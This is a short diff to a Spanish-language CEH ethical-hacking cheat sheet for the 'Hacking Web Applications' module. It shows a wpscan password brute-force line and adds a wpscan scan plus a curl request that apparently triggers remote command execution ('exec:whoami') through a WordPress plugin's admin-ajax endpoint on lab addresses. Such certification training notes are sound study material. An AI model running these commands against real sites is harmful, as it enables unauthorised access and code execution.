@@ -460,6 +460,9 @@ wpscan --url http://192.168.149.138/wp-login.php -P contraseñas.txt -U Elliot
 ## Módulo 14 – Hacking Web Applications
 ```
 nmap -T4 -A -v [URL objetivo]
+wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token from Step#17] command.
+curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' 
+
 
 # Wapiti
 cd wapiti
